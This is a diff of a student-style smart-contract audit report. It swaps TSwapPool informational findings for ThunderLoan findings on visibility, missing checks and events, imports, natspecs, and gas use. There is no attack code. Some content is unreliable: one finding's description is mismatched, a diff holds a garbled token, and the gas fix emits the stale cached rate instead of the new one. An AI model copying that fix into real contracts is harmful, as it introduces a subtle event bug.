+### [I-1]: `public` functions not used internally could be marked `external`
 
-- Found in src/TSwapPool.sol:
+Instead of marking a function as `public`, consider marking it as `external` if it is not used internally.
 
-	```javascript
-	    function swapExactInput(
-        IERC20 inputToken,
-        uint256 inputAmount,
-        IERC20 outputToken,
-        uint256 minOutputAmount,
-        uint64 deadline
-    ) 
-    // The following line should be external.  
-    public
-        revertIfZero(inputAmount)
-        revertIfDeadlinePassed(deadline)
-        returns (uint256 output)
-	```
-
-### [I-2]: Avoid use of magic numbers: Define and use `constant` variables instead of using literals. 
-
-Using `constant` variable increases readability of code and decreases chances of inadvertantly introducing errors. 
-
-If the same constant literal value is used multiple times, create a constant state variable and reference it throughout the contract.
-
-- Found in src/TSwapPool.sol:
-  
-	```javascript
-	        uint256 inputAmountMinusFee = inputAmount * 997;
-	```
-
-- Found in src/TSwapPool.sol:
-  
-	```javascript
-	        return ((inputReserves * outputAmount) * 10000) / ((outputReserves - outputAmount) * 997);
-	```
-
-- Found in src/TSwapPool.sol:
-  
-	```javascript
-	        1e18, i_wethToken.balanceOf(address(this)), i_poolToken.balanceOf(address(this))
-	```
-
-- Found in src/TSwapPool.sol:
-  
-	```javascript
-	        1e18, i_poolToken.balanceOf(address(this)), i_wethToken.balanceOf(address(this))
-	```
-
-- Found in src/TSwapPool.sol:
-  ```javascript
-	        uint256 denominator = (inputReserves * 1000) + inputAmountMinusFee;
-	```
-
-### [I-3]: Large literal values multiples of 10000 can be replaced with scientific notation. Using scientific notation increases readability of code and decreases chances of inadvertantly introducing errors.
-
-Use `e` notation, for example: `1e18`, instead of its full numeric value.
-
-- Found in src/TSwapPool.sol:
-	```javascript
-	    uint256 private constant MINIMUM_WETH_LIQUIDITY = 1_000_000_000;
-	```
-
-- Found in src/TSwapPool.sol:
-	```javascript
-	        return ((inputReserves * outputAmount) * 10000) / ((outputReserves - outputAmount) * 997);
-	```
-
-- Found in src/TSwapPool.sol:
-	```javascript
-	            outputToken.safeTransfer(msg.sender, 1_000_000_000_000_000_000);
-	```
-
-### [I-4]: Unused Custom Error, remove to save gas. 
-
-It is recommended that the definition be removed when custom error is unused. 
-
-- Found in src/PoolFactory.sol: 
+<details><summary>6 Found Instances</summary>
+- Found in src/protocol/ThunderLoan.sol [Line: 254](src/protocol/ThunderLoan.sol#L254)
 
 	```javascript
-	    error PoolFactory__PoolDoesNotExist(address tokenAddress);
+	    function repay(IERC20 token, uint256 amount) public {
 	```
 
-### [I-5]: Absent address(0) check, include to avoid uncaught errors. 
-
-- Found in src/PoolFactory.sol: 
-  
-  ```javascript
-	  constructor(address wethToken) {
-        i_wethToken = wethToken;
-    }
-	```
-
-### [I-6]: Event is missing `indexed` fields.
-
-Index event fields make the field more quickly accessible to off-chain tools that parse events. However, note that each index field costs extra gas during emission, so it's not necessarily best to index the maximum allowed per event (three fields). Each event should use three indexed fields if there are three or more fields, and gas usage is not particularly of concern for the events in question. If there are fewer than three fields, all of the fields should be indexed.
-
-- Found in src/PoolFactory.sol
+- Found in src/protocol/ThunderLoan.sol [Line: 313](src/protocol/ThunderLoan.sol#L313)
 
 	```javascript
-	    event PoolCreated(address tokenAddress, address poolAddress);
+	    function getAssetFromToken(IERC20 token) public view returns (AssetToken) {
 	```
 
-- Found in src/TSwapPool.sol 
+- Found in src/protocol/ThunderLoan.sol [Line: 317](src/protocol/ThunderLoan.sol#L317)
 
 	```javascript
-	    event LiquidityAdded(address indexed liquidityProvider, uint256 wethDeposited, uint256 poolTokensDeposited);
+	    function isCurrentlyFlashLoaning(IERC20 token) public view returns (bool) {
 	```
 
-- Found in src/TSwapPool.sol 
+- Found in src/upgradedProtocol/ThunderLoanUpgraded.sol [Line: 230](src/upgradedProtocol/ThunderLoanUpgraded.sol#L230)
 
 	```javascript
-	    event LiquidityRemoved(address indexed liquidityProvider, uint256 wethWithdrawn, uint256 poolTokensWithdrawn);
+	    function repay(IERC20 token, uint256 amount) public {
 	```
 
-- Found in src/TSwapPool.sol 
+- Found in src/upgradedProtocol/ThunderLoanUpgraded.sol [Line: 275](src/upgradedProtocol/ThunderLoanUpgraded.sol#L275)
 
 	```javascript
-	    event Swap(address indexed swapper, IERC20 tokenIn, uint256 amountTokenIn, IERC20 tokenOut, uint256 amountTokenOut);
+	    function getAssetFromToken(IERC20 token) public view returns (AssetToken) {
 	```
 
-### [I-7]: At `TSwapPool::deposit` the `poolTokenReserves` parameter is unused and can be removed to save gas.
+- Found in src/upgradedProtocol/ThunderLoanUpgraded.sol [Line: 279](src/upgradedProtocol/ThunderLoanUpgraded.sol#L279)
+
+	```javascript
+	    function isCurrentlyFlashLoaning(IERC20 token) public view returns (bool) {
+	```
+</details>
+
+### [I-2]: Missing checks for `address(0)` when assigning values to address state variables
+
+Check for `address(0)` when assigning values to address state variables.
+
+<details><summary>1 Found Instances</summary>
+
+
+- Found in src/protocol/OracleUpgradeable.sol [Line: 17](src/protocol/OracleUpgradeable.sol#L17)
+
+	```javascript
+	        s_poolFactory = poolFactoryAddress;
+	```
+
+</details>
+
+### [I-3]: functions should emit an event what state variables are changed. Some of these events are missing. 
+
+Check for `address(0)` when assigning values to address state variables.
+
+<details><summary>1 Found Instances</summary>
+
+- Found in src/protocol/OracleUpgradeable.sol [Line: 304](src/protocol/ThunderLoan.sol#L304)
+
+	```javascript
+	       s_flashLoanFee = newFee;
+	```
+
+</details>
+
+### [I-4]: It is considered bad practice to change live code to improve testing. Remove and adapt testing files accordingly. 
+
+**Description:**  `IFlashLoanReceiver.sol` includes an unused import of `IThunderLoan`. This import is used solely in the `MockFlashLoanReceiver.sol` test file. 
+
+**Recommended Mitigation:** Remove import from `IFlashLoanReceiver.sol` and adapt `MockFlashLoanReceiver.sol`. 
+
+At `IFlashLoanReceiver.sol` : 
+```diff 
+-   import { IThunderLoan } from "./IThunderLoan.sol";
+```
+
+At `MockFlashLoanReceiver.sol` : 
+```diff 
+-   import { IFlashLoanReceiver, IThunderLoan } from "../../src/interfaces/IFlashLoanReceiver.sol";
++   import { IFlashLoanReceiver } from "../../src/interfaces/IFlashLoanReceiver.sol";
++   import { IThunderLoan } from "../../src/interfaces/IThunderLoan.sol";
+
+```
+
+### [I-5]: Input parameters of `IThunderLoan::repay` differ from `ThunderLoan::repay` repay. 
+
+**Description:**  `IThunderLoan::repay` takes an `address` for the `token` field, while `ThunderLoan::repay` takes an `ERC20` for the token field. 
+
+**Recommended Mitigation:** Use `ERC20` in both cases. Adapt the `IThunderLoan::repay` function. Adjust any (test) files accordingly. 
+
+### [I-6]: State variable that remain unchanged should be immutable or constant. 
+
+**Description:** `ThunderLoan::s_feePrecision` is set at initialisation, but never changed afterwards. 
+
+**Recommended Mitigation:** Change `s_feePrecision` to immutable or, possibly, to a constant. 
+
+### [I-7]: Functions are missing natspecs. Please add.   
+
+**Description:** Almost all functions do not have natspecs. 
+
+**impact** Missing natspecs makes code less readable and increases the chance of inadvertently introducing vulnerabilities.
+
+**Recommended Mitigation:** Add natspecs throughout. 
+
+## Gas
+### [G-1]: `AssetToken.sol::updateExchangeRate` reads from storage multiple times, using gas. 
+
+**Description:** `AssetToken.sol::updateExchangeRate` reads from storage multiple times, each time using quite a bit of gas. 
 
 ```javascript
-  int256 poolTokenReserves = i_poolToken.balanceOf(address(this));
-```
+@>    uint256 newExchangeRate = s_exchangeRate * (totalSupply() + fee) / totalSupply();
 
-### [I-8]: At `TSwapPool::deposit` it is better to set `liquidityTokensToMint` before `_addLiquidityMintAndTransfer` is called to follow CEI conventions. 
-
-- Found in src/TSwapPool.sol 
-  
-```diff
-+    liquidityTokensToMint = wethToDeposit;
-    _addLiquidityMintAndTransfer(wethToDeposit, maximumPoolTokensToDeposit, wethToDeposit);
--    liquidityTokensToMint = wethToDeposit;       
-```
-
-### [I-9]: Function `TSwapPool::swapExactInput` misses a natspec, please include to increase readbility of code and decrease chances of introrducing bugs. 
-
-Natspecs are meant to increase understanding of code for, both internal and external, developers working in the code base. Lacking natspecs increases the chance for introducing bugs due to poor understanding of code. 
-
-- Found in src/TSwapPool.sol 
-
-```javascript 
-   function swapExactInput(
-``` 
-
-### [I-10]: Function `TSwapPool::totalLiquidityTokenSupply` should be set to external, to save gas.
-
-Any function only called externally, can be set to external to save gas. 
-
-- Found in src/TSwapPool.sol 
-
-```javascript 
-    function totalLiquidityTokenSupply() public view returns (uint256) {
-        return totalSupply();
+@>    if (newExchangeRate <= s_exchangeRate) {
+        revert AssetToken__ExhangeRateCanOnlyIncrease(s_exchangeRate, newExchangeRate);
     }
+    s_exchangeRate = newExchangeRate;
+@>    emit ExchangeRateUpdated(s_exchangeRate);
 ```
 
-### [I-11]: Function `PoolFactory::createPool`, the `liquidityTokenSymbol` should read from `.symbol()` not `.name()`.
+**Recommended Mitigation:** This can be mitigated by creating a temporary variable in the function, and using this temporary variable to calculate the exchange rate.  This means the function only reads from storage once instead of three times. 
 
-```diff 
-    string memory liquidityTokenSymbol = string.concat("ts", 
--      IERC20(tokenAddress).name()
-+      IERC20(tokenAddress).symbol()
-    );
+```diff
++    uint256 rate = s_exchangeRate; 
+
+-    uint256 newExchangeRate = s_exchangeRate * (totalSupply() + fee) / totalSupply();
++    uint256 newExchangeRate = rate * (totalSupply() + fee) / totalSupply();
+
+-    if (newExchangeRate <= ras_exchangeRatete) {
+-        revert AssetToken__ExhangeRateCanOnlyIncrease(s_exchangeRate, newExchangeRate);
++    if (newExchangeRate <= rate) {
++        revert AssetToken__ExhangeRateCanOnlyIncrease(rate, newExchangeRate);
+    }
+    s_exchangeRate = newExchangeRate;
+-    emit ExchangeRateUpdated(s_exchangeRate);
++    emit ExchangeRateUpdated(rate);
+
 ```
-
